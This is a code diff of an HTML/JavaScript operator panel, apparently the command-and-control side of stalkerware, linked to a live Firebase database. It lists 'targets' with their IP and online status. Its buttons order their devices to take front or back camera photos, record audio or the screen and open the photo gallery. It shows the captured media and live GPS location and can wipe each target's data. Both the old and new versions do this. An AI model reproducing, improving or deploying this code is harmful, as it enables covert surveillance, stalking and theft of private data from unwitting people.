@@ -1,87 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>BOSS_TRACKING_SYSTEM | V6</title>
+    <title>MASTER_V8_ADMIN</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #111; --border: #222; --red: #ff3131; }
-        body { background: var(--bg); color: var(--neon); font-family: monospace; margin: 0; display: flex; height: 100vh; }
+        :root { --neon: #00ff41; --bg: #0a0a0a; --panel: #151515; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        .sidebar { width: 300px; border-right: 2px solid #222; padding: 15px; overflow-y: auto; }
+        .card { border: 1px solid #333; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; position: relative; }
+        .card:hover, .card.active { background: rgba(0,255,65,0.1); border-color: var(--neon); }
+        .online-dot { width: 8px; height: 8px; background: var(--neon); border-radius: 50%; display: inline-block; position: absolute; right: 10px; top: 15px; box-shadow: 0 0 10px var(--neon); }
         
-        .sidebar { width: 320px; border-right: 1px solid var(--border); padding: 15px; overflow-y: auto; }
-        .target-card { border: 1px solid var(--border); padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; }
-        .target-card.active { border-left: 5px solid var(--neon); background: rgba(0,255,65,0.1); }
-        
-        /* Online Status logic */
-        .status-online { font-size: 10px; color: var(--neon); position: absolute; right: 10px; top: 10px; font-weight: bold; }
-        .target-name { color: #fff; font-weight: bold; display: block; margin-bottom: 5px; }
-
-        .main { flex: 1; padding: 20px; overflow-y: auto; }
-        .control-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
-        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; cursor: pointer; font-size: 11px; text-transform: uppercase; }
+        .main { flex: 1; padding: 25px; overflow-y: auto; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+        .box { background: var(--panel); border: 1px solid #222; padding: 15px; border-radius: 8px; }
+        .btn { background: none; border: 1px solid var(--neon); color: var(--neon); padding: 8px; cursor: pointer; margin: 5px; font-weight: bold; width: 140px; }
         .btn:hover { background: var(--neon); color: #000; }
-        .btn-red { border-color: var(--red); color: var(--red); }
-
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 5px; position: relative; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+        .gallery img, .gallery video { width: 100%; border: 1px solid #333; }
         
-        /* Visual Data with X button */
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 15px; }
-        .item-container { position: relative; border: 1px solid #333; padding: 2px; }
-        .gallery img { width: 100%; display: block; }
-        .delete-btn { position: absolute; top: -5px; right: -5px; background: var(--red); color: white; border: none; border-radius: 50%; width: 20px; height: 20px; cursor: pointer; font-weight: bold; font-size: 12px; z-index: 10; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 5px #000; }
-        
-        .audio-item { margin-bottom: 10px; display: flex; align-items: center; gap: 10px; background: #000; padding: 5px; position: relative; }
-        input[type="text"] { background: #000; border: 1px solid #333; color: #fff; padding: 5px; width: 80%; margin-top: 5px; }
+        #map-container { width: 100%; height: 200px; background: #000; border: 1px solid #333; margin-top: 10px; }
+        iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <h3>BOSS TRAKING SYSTEM</h3>
-    <div id="target-list">Connecting...</div>
+    <h2 style="border-bottom: 2px solid var(--neon); padding-bottom: 10px;">V8_COMMANDER</h2>
+    <div id="target-list">Connecting Database...</div>
 </div>
 
 <div class="main">
-    <div id="header-area" style="display:flex; justify-content: space-between; align-items: center;">
-        <h1 id="display-id">SELECT_TARGET</h1>
-        <div id="name-editor" style="display:none;">
-            <input type="text" id="target-alias" placeholder="Set Target Name...">
-            <button onclick="saveName()" class="btn" style="padding:5px;">SAVE NAME</button>
-        </div>
-    </div>
-
     <div id="controls" style="display:none;">
-        <div class="control-grid">
-            <button class="btn" onclick="sendCmd('photo')">Capture Photo</button>
-            <button class="btn" onclick="sendCmd('back_photo')">Back Camera</button>
-            <button class="btn" onclick="sendCmd('audio')">Audio Record</button>
-            <button class="btn" onclick="trackLive()">Live Location</button>
-            <button class="btn" onclick="showDetails()">User Details</button>
-            <button class="btn" onclick="location.reload()">Refresh</button>
-            <button class="btn btn-red" onclick="deleteTarget()">Delete User Data</button>
+        <h1 id="active-user">Select User</h1>
+        <div style="margin-bottom: 20px;">
+            <button class="btn" onclick="send('photo')">Front Cam</button>
+            <button class="btn" onclick="send('back_photo')">Back Cam</button>
+            <button class="btn" onclick="send('gallery_access')">Open Gallery</button>
+            <button class="btn" onclick="send('screen_record')">Record Screen</button>
+            <button class="btn" style="border-color:red; color:red;" onclick="deleteUser()">Wipe Data</button>
         </div>
-    </div>
 
-    <div class="grid">
-        <div class="box">
-            <h3>LOGS / DETAILS</h3>
-            <div id="info-box">...</div>
-        </div>
-        <div class="box">
-            <h3>MAP_TRACKER</h3>
-            <div id="map-box" style="height:150px; display:flex; align-items:center; justify-content:center; border:1px dashed #333;">
-                Waiting for GPS...
+        <div class="grid">
+            <div class="box">
+                <h3>TARGET_LOCATION (Live Tracker)</h3>
+                <div id="map-container">No Signal</div>
+                <button class="btn" style="width:100%; margin-top:10px;" id="map-btn">OPEN FULL MAP (NEW TAB)</button>
             </div>
-        </div>
-        <div class="box">
-            <h3>AUDIO_INTERCEPT</h3>
-            <div id="audio-box"></div>
-        </div>
-        <div class="box">
-            <h3>VISUAL_DATA</h3>
-            <div id="photo-box" class="gallery"></div>
+            <div class="box">
+                <h3>DEVICE_INFO</h3>
+                <div id="info-box">...</div>
+            </div>
+            <div class="box" style="grid-column: span 2;">
+                <h3>VISUAL_DATA_FEED (Photos / Gallery / Screen)</h3>
+                <div id="media-box" class="gallery"></div>
+            </div>
         </div>
     </div>
 </div>
@@ -90,106 +65,67 @@
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let currentTid = null;
-    let gps = null;
+    let selectedID = null;
 
-    // 1. Sidebar Logic (Only show 'online' if active)
     db.ref('targets').on('value', snap => {
         const list = document.getElementById('target-list');
         list.innerHTML = "";
-        snap.forEach(c => {
-            const tid = c.key;
-            const data = c.val();
-            const name = data.alias || tid;
-            const isOnline = data.info && data.info.status === "ONLINE";
-            
+        snap.forEach(t => {
+            const id = t.key;
+            const data = t.val();
             list.innerHTML += `
-                <div class="target-card ${currentTid === tid ? 'active' : ''}" onclick="selectTarget('${tid}')">
-                    <span class="target-name">${name}</span>
-                    <small style="font-size:9px;">${tid}</small>
-                    ${isOnline ? '<span class="status-online">online</span>' : ''}
+                <div class="card ${selectedID === id ? 'active' : ''}" onclick="select('${id}')">
+                    <strong>${id}</strong><br><small>${data.info ? data.info.ip : 'Pending'}</small>
+                    ${data.info && data.info.status === 'ONLINE' ? '<div class="online-dot"></div>' : ''}
                 </div>`;
         });
     });
 
-    function selectTarget(tid) {
-        currentTid = tid;
-        document.getElementById('display-id').innerText = tid;
+    function select(id) {
+        selectedID = id;
         document.getElementById('controls').style.display = 'block';
-        document.getElementById('name-editor').style.display = 'block';
+        document.getElementById('active-user').innerText = "TRACKING: " + id;
         
-        // Load System Info
-        db.ref(`targets/${tid}/info`).on('value', s => {
+        // Info Listener
+        db.ref(`targets/${id}/info`).on('value', s => {
             const d = s.val() || {};
-            document.getElementById('info-box').innerHTML = `IP: ${d.ip || '---'}<br>Batt: ${d.battery || '---'}<br>Device: ${d.device || '---'}<br>Last PING: <span style="color:var(--red)">${d.time || '---'}</span>`;
+            document.getElementById('info-box').innerHTML = `IP: ${d.ip}<br>Batt: ${d.battery}<br>OS: ${d.device}<br>Last: ${d.time}`;
         });
 
-        // Load Photos with Delete X
-        db.ref(`targets/${tid}/photos`).on('value', s => {
-            const b = document.getElementById('photo-box'); b.innerHTML = "";
-            s.forEach(p => {
-                const imgID = p.key;
-                const imgData = p.val().img;
-                b.innerHTML += `
-                    <div class="item-container">
-                        <button class="delete-btn" onclick="deleteItem('photos', '${imgID}')">X</button>
-                        <img src="${imgData}" onclick="window.open(this.src)">
-                    </div>`;
-            });
-        });
-
-        // Load Audios with Delete X
-        db.ref(`targets/${tid}/audios`).on('value', s => {
-            const b = document.getElementById('audio-box'); b.innerHTML = "";
-            s.forEach(a => {
-                const audID = a.key;
-                const audSrc = a.val().audio;
-                b.innerHTML += `
-                    <div class="audio-item">
-                        <button class="delete-btn" style="position:relative; top:0; right:0;" onclick="deleteItem('audios', '${audID}')">X</button>
-                        <audio controls src="${audSrc}" style="width:150px; height:30px;"></audio>
-                    </div>`;
-            });
-        });
-
-        // Map Fix
-        db.ref(`targets/${tid}/location`).on('value', s => {
-            gps = s.val();
-            if(gps && gps.lat) {
-                document.getElementById('map-box').innerHTML = `<button class="btn" onclick="window.open('https://www.google.com/maps?q=${gps.lat},${gps.lng}')">TRACK ON MAP</button>`;
+        // Map Listener
+        db.ref(`targets/${id}/location`).on('value', s => {
+            const loc = s.val();
+            if(loc && loc.lat) {
+                const url = `https://www.google.com/maps?q=${loc.lat},${loc.lng}&output=embed`;
+                document.getElementById('map-container').innerHTML = `<iframe src="${url}"></iframe>`;
+                document.getElementById('map-btn').onclick = () => window.open(`https://www.google.com/maps?q=${loc.lat},${loc.lng}`);
             }
         });
+
+        // Media Listener (Combined)
+        db.ref(`targets/${id}`).on('value', s => {
+            const box = document.getElementById('media-box'); box.innerHTML = "";
+            const data = s.val();
+            
+            // Photos
+            if(data.photos) Object.values(data.photos).reverse().forEach(p => {
+                box.innerHTML += `<img src="${p.img}" onclick="window.open(this.src)">`;
+            });
+            // Gallery
+            if(data.gallery_files) Object.values(data.gallery_files).forEach(f => {
+                box.innerHTML += `<img src="${f.data}" title="${f.name}" onclick="window.open(this.src)">`;
+            });
+            // Screen Records
+            if(data.screen_records) Object.values(data.screen_records).forEach(v => {
+                box.innerHTML += `<video controls src="${v.video}" style="height:120px;"></video>`;
+            });
+        });
     }
 
-    // Command System
-    function sendCmd(act) { db.ref(`commands/${currentTid}`).set({ action: act, t: Date.now() }); }
+    function send(act) { db.ref(`commands/${selectedID}`).set({ action: act, t: Date.now() }); }
     
-    // Single Item Delete (X button logic)
-    function deleteItem(type, id) {
-        if(confirm("Delete this " + type + "?")) {
-            db.ref(`targets/${currentTid}/${type}/${id}`).remove();
-        }
-    }
-
-    function saveName() {
-        const name = document.getElementById('target-alias').value;
-        if(name) db.ref(`targets/${currentTid}/alias`).set(name);
-    }
-
-    function trackLive() {
-        if(gps) window.open(`https://www.google.com/maps?q=${gps.lat},${gps.lng}`);
-        else alert("No GPS signal yet!");
-    }
-
-    function showDetails() {
-        alert("Target Details:\n" + document.getElementById('info-box').innerText.replace(/<br>/g, '\n'));
-    }
-
-    function deleteTarget() {
-        if(confirm("DANGER: Permanently wipe all data for this user?")) {
-            db.ref(`targets/${currentTid}`).remove();
-            location.reload();
-        }
+    function deleteUser() {
+        if(confirm("Confirm Wipe?")) { db.ref(`targets/${selectedID}`).remove(); location.reload(); }
     }
 </script>
 </body>
